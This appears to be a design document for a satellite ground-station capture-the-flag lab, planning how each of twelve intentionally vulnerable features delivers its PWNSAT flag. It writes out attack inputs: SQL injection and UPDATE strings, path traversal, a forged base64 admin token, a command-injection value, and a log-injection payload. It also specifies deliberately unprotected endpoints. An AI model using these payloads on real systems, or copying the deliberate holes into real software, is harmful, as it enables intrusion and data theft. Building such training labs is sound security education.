# GS Flag Delivery Design

**Goal:** Make all 12 ground station CTF flags discoverable by participants through natural exploitation of each vulnerability.

**Status quo:** Only GS-01 (SQLi extracts admin hash) and GS-03 (RCE reads flag.txt) deliver flags. The remaining 10 vulnerabilities are exploitable but don't expose a `PWNSAT{...}` string.

**Approach:** Plant each flag where the exploitation naturally finds it — files for filesystem vulns, DB records for data-access vulns, endpoints for access-control vulns.

---

## Flag Inventory

| GS | Vulnerability | Flag | Mechanism | Status |
|----|--------------|------|-----------|--------|
| 01 | SQL Injection | `PWNSAT{ADMIN_HASH_5F4DCC3B}` | Already works | No changes |
| 02 | Stored XSS | `PWNSAT{XSS_IN_MISSION_LOGS}` | DB seed | New |
| 03 | RCE | `PWNSAT{RCE_ON_GROUND_STATION}` | Already works | No changes |
| 04 | LFI | `PWNSAT{LFI_TRAVERSAL_SUCCESS}` | File | New |
| 05 | Auth Bypass | `PWNSAT{SESSION_TOKEN_FORGED}` | Endpoint | New |
| 06 | IDOR | `PWNSAT{IDOR_ADMIN_CONFIG}` | DB seed | New |
| 07 | Command Injection | `PWNSAT{CMDI_IN_RADIO_CONFIG}` | File | New |
| 08 | Kill Chain | `PWNSAT{WEB_TO_SPACE_LINK}` | Endpoint | New |
| 09 | DB Tampering | `PWNSAT{TELEMETRY_DB_TAMPERED}` | DB seed | New |
| 10 | Supply Chain | `PWNSAT{SUPPLY_CHAIN_COMPROMISED}` | File | New |
| 11 | Log Injection | `PWNSAT{LOG_INJECTION_SUCCESS}` | DB seed | New |
| 12 | API Enumeration | `PWNSAT{API_NO_RATE_LIMIT}` | Endpoint | New |

---

## Detailed Design

### GS-01 (SQLi) — No changes

The participant uses `UNION SELECT` on `/api/telemetry?search=` to extract the `users` table. The admin's `password_hash` is `5f4dcc3b5aa765d61d8327deb882cf99` (MD5 of "password"). The flag `PWNSAT{ADMIN_HASH_5F4DCC3B}` is constructed from the first 8 hex chars of the hash. Already seeded in `seed.py`.

### GS-02 (XSS) — DB seed + new endpoint

**Schema change:** Add column `admin_notes TEXT DEFAULT ''` to the `users` table.

**Seed change:** Set admin's `admin_notes` to `PWNSAT{XSS_IN_MISSION_LOGS}`.

**New endpoint:** `GET /api/users/me` — returns the logged-in user's record as JSON, including `admin_notes`. Protected by `@login_required`.

**Exploitation flow:**
1. Participant injects XSS payload into `/api/logs` POST (stored in logs table)
2. When an admin views `/logs`, the script executes in their browser
3. The XSS payload calls `/api/users/me` with the admin's session and exfiltrates `admin_notes`
4. Alternative: participant forges admin token (GS-05) and calls `/api/users/me` directly

**Why this works:** XSS steals data from the victim's session. The flag lives in admin-only data accessible via the victim's auth context.

### GS-03 (RCE) — No changes

`webapp/flag.txt` contains `PWNSAT{RCE_ON_GROUND_STATION}`. Participant reads it via `/api/diagnostics` with `cmd: "cat webapp/flag.txt"`.

### GS-04 (LFI) — New file

**New file:** `webapp/lfi_flag.txt` containing `PWNSAT{LFI_TRAVERSAL_SUCCESS}`.

**Exploitation flow:**
1. Participant discovers `/api/logs?file=` endpoint (via GS-12 or exploration)
2. Path traversal: `GET /api/logs?file=../lfi_flag.txt`
3. Response: `{"content": "PWNSAT{LFI_TRAVERSAL_SUCCESS}"}`

**Why a separate file:** If GS-04 read the same `flag.txt` as GS-03, both challenges would share a flag. Each vuln needs its own flag to be independently scoreable in CTFd.

### GS-05 (Auth Bypass) — New endpoint

**New endpoint:** `GET /api/admin/panel` — protected by `@login_required` plus explicit role check: `if g.role != "admin": return {"error": "Forbidden"}, 403`.

**Response (admin only):**
```json
{
  "message": "Ground Station Admin Panel",
  "flag": "PWNSAT{SESSION_TOKEN_FORGED}",
  "connected_satellites": [],
  "system_status": "operational"
}
```

**Exploitation flow:**
1. Participant forges token: `base64("admin:admin:0")` = `YWRtaW46YWRtaW46MA==`
2. Sets cookie `session_token=YWRtaW46YWRtaW46MA==`
3. `GET /api/admin/panel` returns 200 with flag

**Why an endpoint:** Auth bypass means accessing restricted resources. The flag IS the restricted resource.

### GS-06 (IDOR) — DB seed

**Schema change:** Add column `notes TEXT DEFAULT ''` to the `radio_config` table.

**Seed change:** Admin's radio config (id=1) gets `notes = "PWNSAT{IDOR_ADMIN_CONFIG}"`.

**Exploitation flow:**
1. Participant is logged in as `operator`
2. `GET /api/config/radio/1` returns admin's config (no ownership check)
3. Response includes `"notes": "PWNSAT{IDOR_ADMIN_CONFIG}"`

**Why this works:** The existing endpoint already returns `dict(config)` without filtering fields. Adding `notes` to the seed makes the flag appear naturally in the IDOR response. No code change needed in the route — only schema + seed.

### GS-07 (CMDi) — New file

**New file:** `webapp/radio_flag.txt` containing `PWNSAT{CMDI_IN_RADIO_CONFIG}`.

**Exploitation flow:**
1. Participant sends `POST /api/config/radio` with `{"frequency": "915000000; cat radio_flag.txt"}`
2. Shell executes: `echo 'Setting frequency to 915000000; cat radio_flag.txt ...'`
3. Response `shell_output` includes the flag

**Why a separate file from GS-03:** Different vuln, different flag. The participant must exploit CMDi specifically (in the radio config endpoint), not RCE (in diagnostics).

### GS-08 (Kill Chain) — New endpoint

**New endpoint:** `GET /api/radio/status` — protected by `@login_required`.

**Response:**
```json
{
  "connected": true,
  "mode": "hardware",
  "serial_number": "5033423532300010",
  "bridge_key": "PWNSAT{WEB_TO_SPACE_LINK}",
  "uplink_freq": 916000000,
  "downlink_freq": 915000000
}
```

When no hardware connected: `{"connected": false, "mode": "simulated", "bridge_key": "PWNSAT{WEB_TO_SPACE_LINK}"}`.

**Exploitation flow:**
1. Participant achieves RCE (GS-03)
2. Reads `radio_bridge.py` source to understand the radio interface
3. Discovers `/api/radio/status` endpoint
4. Accesses it to get the flag and radio config for pivoting to satellite

**Why this endpoint:** The kill chain is about discovering the ground-to-space bridge. The flag rewards understanding the radio infrastructure, not just having RCE.

### GS-09 (DB Tampering) — New table + seed

**Schema change:** New table `secrets`:
```sql
CREATE TABLE IF NOT EXISTS secrets (
    id INTEGER PRIMARY KEY,
    name TEXT NOT NULL,
    value TEXT NOT NULL,
    access_level TEXT DEFAULT 'classified'
);
```

**Seed:** Insert `{name: "satellite_master_key", value: "PWNSAT{TELEMETRY_DB_TAMPERED}", access_level: "classified"}`.

**Exploitation flow:**
1. Participant discovers the `secrets` table via SQLi: `' UNION SELECT name, value, access_level, 4,5,6,7,8,9,10,11,12,13 FROM secrets--`
2. Extracts the flag
3. Can also demonstrate tampering: `'; UPDATE secrets SET access_level='public' WHERE id=1;--`

**Why a separate table:** The `secrets` table is not exposed by any endpoint. It can only be reached via SQL injection, making it the natural reward for mastering SQLi beyond just reading `users`.

### GS-10 (Supply Chain) — File modification

**Change:** Add comment to `requirements.txt`:
```
# PWNSAT{SUPPLY_CHAIN_COMPROMISED}
# TODO: pin all dependencies before production deployment
requests
```

**Exploitation flow:**
1. Participant inspects `requirements.txt` (via LFI with `?file=../../requirements.txt`, RCE, or source code review)
2. Notices `requests` is unpinned + the flag comment
3. Understands the supply chain risk: unpinned dependency = attacker can publish malicious version

**Why a comment:** Supply chain vulns are about reviewing build artifacts and dependencies. The flag rewards inspection, not runtime exploitation.

### GS-11 (Log Injection) — DB seed + filter

**Seed change:** Add log entry:
```python
{
    "timestamp": "2026-01-01T00:00:00",
    "level": "DEBUG",
    "source": "flag-service",
    "message": "PWNSAT{LOG_INJECTION_SUCCESS}"
}
```

**Code change:** The `GET /api/logs` endpoint (when returning DB logs, not file) filters out `DEBUG` level by default:
```python
rows = db.execute(
    "SELECT * FROM logs WHERE level != 'DEBUG' ORDER BY id DESC"
).fetchall()
```

**Exploitation flow:**
1. Participant notices logs page doesn't show DEBUG entries
2. Injects via `POST /api/logs` with newline: `{"message": "normal\n2026-01-01T00:00:00|DEBUG|flag-service|revealed"}`
3. The injection corrupts the log display, revealing that DEBUG entries exist
4. Participant then uses SQLi (from GS-01) to query: `' UNION SELECT id,timestamp,level,source,message,6,7,8,9,10,11,12,13 FROM logs WHERE level='DEBUG'--`
5. Extracts the flag

**Why DEBUG filter:** Log injection is about manipulating log integrity. The flag is hidden behind a filter that the participant must bypass — either through injection that reveals the hidden entries or through SQLi on the logs table.

### GS-12 (API Enumeration) — New endpoint

**New endpoint:** `GET /api/debug/flags` — no authentication required (deliberately).

**Response:**
```json
{
  "flag": "PWNSAT{API_NO_RATE_LIMIT}",
  "hint": "This endpoint should not be public"
}
```

**Exploitation flow:**
1. Participant calls `GET /api/endpoints` (also unauthenticated)
2. Sees `/api/debug/flags` in the list
3. Accesses it directly, gets the flag

**Why this endpoint:** API enumeration is about discovering hidden/unprotected endpoints. The flag IS the hidden endpoint — finding it is the challenge.

---

## Changes Summary

### New files (2)
- `webapp/lfi_flag.txt` — `PWNSAT{LFI_TRAVERSAL_SUCCESS}`
- `webapp/radio_flag.txt` — `PWNSAT{CMDI_IN_RADIO_CONFIG}`

### Modified files (4)
- `requirements.txt` — Add flag comment above unpinned `requests`
- `webapp/db.py` — Add `admin_notes` to users, `notes` to radio_config, new `secrets` table
- `webapp/seed.py` — Plant flags in admin_notes, radio_config notes, secrets row, DEBUG log entry
- `webapp/app.py` — 4 new endpoints + DEBUG filter on logs GET:
  - `GET /api/users/me` (login required)
  - `GET /api/admin/panel` (admin role required)
  - `GET /api/radio/status` (login required)
  - `GET /api/debug/flags` (no auth)
  - Modify existing logs GET to filter `level != 'DEBUG'`

### Tests
- Update existing vuln tests to verify flag discovery
- Add flag delivery tests for each of the 10 new flags
- Test that non-admin cannot access `/api/admin/panel`
- Test that `/api/debug/flags` is listed in `/api/endpoints`
- Test that DEBUG logs are filtered by default
